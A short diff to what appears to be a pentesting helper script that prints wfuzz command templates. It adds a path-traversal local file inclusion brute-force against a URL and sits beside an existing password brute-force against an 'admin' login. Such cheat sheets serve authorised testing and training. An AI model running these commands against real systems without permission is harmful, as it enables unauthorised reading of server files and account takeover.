@@ -40,6 +40,11 @@ echo -e "${Point} wfuzz -c -w /usr/share/SecLists/Discovery/Web-Content/burp-par
 echo -e ""
 
 
+echo -e "${Frame}###${End} ${Title}LFI files Bruteforce${End} ${Frame}###${End}"
+echo -e "${Point} wfuzz -c -w /usr/share/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt --hh 0 \$URL../../../../../../../FUZZ"
+echo -e ""
+
+
 echo -e "${Frame}###${End} ${Title}LFI Parameter Bruteforce${End} ${Frame}###${End}"
 echo -e "${Point} wfuzz -u \$URL -d \"username=admin&password=FUZZ\" -w $wordlist --hh \$hide_size -c"
 echo -e ""
